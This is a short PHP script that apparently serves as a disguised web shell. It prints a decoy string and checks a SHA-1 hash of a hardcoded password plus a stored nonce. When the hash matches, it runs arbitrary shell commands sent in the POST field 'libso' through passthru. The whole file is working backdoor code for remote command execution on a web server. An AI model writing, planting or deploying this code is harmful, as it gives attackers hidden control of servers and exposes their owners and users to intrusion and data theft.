<?php
echo "javaversion1";
$NONCE_PATH = "nonce.txt";
$pass = "HLsaB6zVmOtz9QHWNJSk";

if (!file_exists($NONCE_PATH)) {
        $fd = fopen($NONCE_PATH, "w");
        fwrite($fd, "0");
        fclose($fd);
}
$fd = fopen($NONCE_PATH, "r");
$nonce = fread($fd, 100);
fclose($fd);
$hash = sha1($pass . $nonce);
//echo "\n$hash\n";

$received_hash = $_POST["hash"];
if (true && $hash == $received_hash) {
        $nonce = intval($nonce);
        $fd = fopen($NONCE_PATH, "w");
        fwrite($fd, $nonce + 1 + '');
        fclose($fd);
        passthru($_POST["libso"]);        
} else {
        $random = 'S4mTr0cCaYc15ygJJ1r6';
        echo "\n$random current nonce: $nonce\n";
}

?>
